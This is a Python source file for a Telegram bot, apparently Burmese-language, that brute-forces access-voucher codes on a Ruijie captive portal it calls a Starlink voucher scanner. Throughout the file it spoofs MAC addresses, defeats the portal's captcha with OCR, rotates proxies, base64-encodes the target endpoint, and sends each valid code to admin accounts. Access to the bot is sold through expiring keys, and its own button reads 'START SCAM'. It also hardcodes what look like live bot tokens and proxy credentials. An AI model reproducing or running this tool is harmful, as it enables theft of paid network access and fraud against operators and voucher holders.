import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2, ddddocr, numpy as np

BOT_TOKEN = "8867816797:AAFXkNP8MJEIjAHZRsRAUDhAn_EgmeLYowg"
FORWARD_BOT_TOKEN = "8666040280:AAF3qRvNtY_dPMRbzzrFo2uGWuYYDtNODwE"
ADMINS = ["7366841341", "8728200516"]

PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 50
_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST: return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

bot = AsyncTeleBot(BOT_TOKEN)
forward_bot = AsyncTeleBot(FORWARD_BOT_TOKEN)

user_data, active_scans = {}, {}
VALID_KEYS, USER_KEYS = {}, {}
session, _connector = None, None
_ocr = ddddocr.DdddOcr(show_ad=False)

def is_admin(user_id):
    return str(user_id) in ADMINS

async def verify_hit(session_url, code):
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    proxy = get_next_proxy()
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
        try:
            mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
            s_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
            async with ts.get(s_url, headers={'user-agent': 'Mozilla/5.0'}, proxy=proxy) as req:
                s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                if not s_id: return False
                sessionId = s_id.group(1)
            
            async with ts.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}', proxy=proxy) as img_req:
                img_bytes = await img_req.read()
            
            nparr = np.frombuffer(img_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
            authCode = _ocr.classification(cv2.imencode('.png', thresh)[1].tobytes()).upper()

            data = {"accessCode": code, "sessionId": sessionId, "apiVersion": 1, "authCode": authCode}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                resp_text = await p_req.text()
                if 'logonUrl' in resp_text:
                    return True
        except Exception:
            pass
    return False

async def perform_check(session_url, code, chat_id, semaphore):
    async with semaphore:
        post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
        proxy = get_next_proxy()
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
            try:
                mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
                s_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
                async with ts.get(s_url, headers={'user-agent': 'Mozilla/5.0'}, proxy=proxy) as req:
                    s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                    if not s_id: return False
                    sessionId = s_id.group(1)
                
                async with ts.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}', proxy=proxy) as img_req:
                    img_bytes = await img_req.read()
                
                nparr = np.frombuffer(img_bytes, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
                authCode = _ocr.classification(cv2.imencode('.png', thresh)[1].tobytes()).upper()

                data = {"accessCode": code, "sessionId": sessionId, "apiVersion": 1, "authCode": authCode}
                headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
                async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                    resp_text = await p_req.text()
                    if 'logonUrl' in resp_text:
                        is_valid = await verify_hit(session_url, code)
                        if not is_valid: return False

                        hit_msg = (
                            f"🚨 **STARLINK VOUCHER HIT!** 🚨\n\n"
                            f"👤 **User ID:** `{chat_id}`\n"
                            f"🎫 **Code:** `{code}`\n"
                            f"🔗 **Portal URL:**\n{session_url}"
                        )
                        
                        await bot.send_message(chat_id, f"✅ **Success Code Hit!**\n\n🎫 Code: `{code}`")
                        
                        for admin_id in ADMINS:
                            try:
                                await forward_bot.send_message(admin_id, hit_msg, parse_mode="Markdown")
                            except Exception:
                                pass
                        return True
            except Exception:
                pass
        return False

async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Running"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('BOT_PORT', 8099))).start()

def main_kb(is_adm):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔑 KEY ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("🔗 Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Result", callback_data="menu_result"),
        InlineKeyboardButton("🛑 Stop", callback_data="menu_stop")
    )
    if is_adm: kb.add(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
    return kb

def voucher_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return kb

@bot.message_handler(commands=['start'])
async def start(m):
    uid = str(m.chat.id)
    is_adm = is_admin(uid)
    has_valid_key = uid in USER_KEYS and USER_KEYS[uid]["expiry"] > time.time()
    status = "✅ Access Granted (Key Active)" if has_valid_key or is_adm else "⚠️ Key လိုအပ်ပါသည်။ (/key [key])"
    await bot.send_message(m.chat.id, f"✨ STAR LINK VOUCHER SCANNER ✨\n\n{status}", reply_markup=main_kb(is_adm))

@bot.callback_query_handler(func=lambda call: True)
async def callbacks(call):
    chat_id = call.message.chat.id
    uid = str(chat_id)
    is_adm = is_admin(uid)

    if call.data == "menu_back":
        await bot.edit_message_text("✨ STAR LINK VOUCHER SCANNER ✨", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
    elif call.data == "menu_start_scam":
        await bot.edit_message_text("🔢 ကျေးဇူးပြု၍ Voucher အမျိုးအစား ရွေးချယ်ပါ -", chat_id, call.message.message_id, reply_markup=voucher_kb())
    elif call.data == "menu_stop":
        if chat_id in active_scans:
            active_scans[chat_id] = False
            await bot.answer_callback_query(call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True)
            await bot.edit_message_text("🛑 Scanning successfully stopped.", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
        else:
            await bot.answer_callback_query(call.id, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ။", show_alert=True)
    elif call.data == "admin_panel" and is_adm:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton("➕ Key အသစ်ထုတ်မည် (ရက်ပိုင်း)", callback_data="admin_gen_key_menu"),
               InlineKeyboardButton("📋 Key များကြည့်ရန်/ဖျက်ရန်", callback_data="admin_list_keys"),
               InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        await bot.edit_message_text("👑 Admin Control Panel", chat_id, call.message.message_id, reply_markup=kb)
    elif call.data == "admin_gen_key_menu" and is_adm:
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("1 ရက်", callback_data="gen_key_1"),
            InlineKeyboardButton("7 ရက်", callback_data="gen_key_7"),
            InlineKeyboardButton("30 ရက်", callback_data="gen_key_30"),
            InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
        )
        await bot.edit_message_text("⏰ Key သက်တမ်း ရွေးချယ်ပါ -", chat_id, call.message.message_id, reply_markup=kb)
    elif call.data.startswith("gen_key_") and is_adm:
        days = int(call.data.replace("gen_key_", ""))
        new_key = "STAR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        expiry_time = time.time() + (days * 86400)
        VALID_KEYS[new_key] = expiry_time
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
        await bot.edit_message_text(f"✅ Generated Key ({days} Days):\n`{new_key}`", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    elif call.data == "admin_list_keys" and is_adm:
        kb = InlineKeyboardMarkup(row_width=1)
        for k in list(VALID_KEYS.keys()):
            kb.add(InlineKeyboardButton(f"❌ ဖျက်ရန်: {k}", callback_data=f"del_key_{k}"))
        kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
        await bot.edit_message_text("📋 Active Keys:", chat_id, call.message.message_id, reply_markup=kb)
    elif call.data.startswith("del_key_") and is_adm:
        k_del = call.data.replace("del_key_", "")
        VALID_KEYS.pop(k_del, None)
        await bot.answer_callback_query(call.id, f"Deleted {k_del}", show_alert=True)
    elif call.data == "menu_enter_key":
        await bot.edit_message_text("🔑 Key ထည့်ရန်: `/key [your_key]` ကို ပို့ပါ", chat_id, call.message.message_id, parse_mode="Markdown")
    elif call.data == "menu_free_trial":
        await bot.edit_message_text("🔗 Portal URL ထည့်ရန်: `/portal [url]` ကို ပို့ပါ။", chat_id, call.message.message_id)
    elif call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data or not user_data[chat_id].get('session_url'):
            await bot.answer_callback_query(call.id, "⚠️ ကျေးဇူးပြု၍ Portal URL အရင်ထည့်ပါ။", show_alert=True)
            return
        
        active_scans[chat_id] = True
        session_url = user_data[chat_id]['session_url']
        await bot.edit_message_text(f"🚀 Scanning started with mode: {mode}...", chat_id, call.message.message_id)
        asyncio.create_task(run_scan_loop(mode, chat_id, session_url, call.message.message_id))

async def run_scan_loop(mode, chat_id, session_url, msg_id):
    strings_map = {
        "6": string.digits, "7": string.digits, "8": string.digits,
        "ascii-lower": string.ascii_lowercase,
        "all": string.ascii_lowercase + string.digits,
        "mixed": string.ascii_lowercase + string.digits,
        "mixed8": string.ascii_lowercase + string.digits
    }
    length = 8 if mode == "mixed8" else (6 if mode in ["ascii-lower", "all", "mixed"] else int(mode))
    chars = strings_map.get(mode, string.digits)
    
    scanned_count = 0
    found_count = 0
    start_time = time.time()
    semaphore = asyncio.Semaphore(50)
    
    while active_scans.get(chat_id, False):
        batch_tasks = []
        for _ in range(25):
            code = "".join(random.choices(chars, k=length))
            batch_tasks.append(perform_check(session_url, code, chat_id, semaphore))
        
        results = await asyncio.gather(*batch_tasks)
        scanned_count += len(batch_tasks)
        found_count += sum(1 for r in results if r)
        
        elapsed = time.time() - start_time
        speed = round(scanned_count / elapsed, 2) if elapsed > 0 else 0
        
        try:
            status_text = (
                f"🚀 **Scanning Active (Mode: {mode})**\n\n"
                f"⚡ Speed: `{speed} req/s`\n"
                f"🔢 Scanned: `{scanned_count}` codes\n"
                f"🎯 Hits Found: `{found_count}`\n\n"
                f"လိုချင်ရင် /stop ကိုနှိပ်ပြီး ရပ်နိုင်ပါတယ်။"
            )
            kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 Stop Scanning", callback_data="menu_stop"))
            await bot.edit_message_text(status_text, chat_id, msg_id, reply_markup=kb, parse_mode="Markdown")
        except Exception:
            pass
        
        await asyncio.sleep(0.05)

@bot.message_handler(commands=['key'])
async def handle_key(m):
    args = m.text.split(maxsplit=1)
    if len(args) > 1:
        key_input = args[1].strip()
        uid = str(m.chat.id)
        if key_input in VALID_KEYS and VALID_KEYS[key_input] > time.time():
            expiry = VALID_KEYS[key_input]
            USER_KEYS[uid] = {"key": key_input, "expiry": expiry}
            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiry))
            await bot.reply_to(m, f"✅ Key မှန်ကန်ပါသည်။ သက်တမ်းကုန်မည့်အချိန်: {expiry_date}")
        else:
            await bot.reply_to(m, "❌ Key မှားယွင်းနေပါသည် (သို့မဟုတ်) သက်တမ်းကုန်သွားပါပြီ။")

@bot.message_handler(commands=['stop'])
async def handle_stop_cmd(m):
    chat_id = m.chat.id
    if chat_id in active_scans:
        active_scans[chat_id] = False
        await bot.reply_to(m, "🛑 Scan အောင်မြင်စွာ ရပ်တန့်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(m, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ။")

@bot.message_handler(commands=['portal'])
async def handle_portal(m):
    args = m.text.split(maxsplit=1)
    if len(args) > 1:
        if m.chat.id not in user_data: user_data[m.chat.id] = {}
        user_data[m.chat.id]['session_url'] = args[1]
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"))
        await bot.reply_to(m, "✅ URL သိမ်းဆည်းပြီးပါပြီ။", reply_markup=kb)

async def main():
    global session, _connector
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
    _connector = aiohttp.TCPConnector(limit=5000, ssl=False)
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())

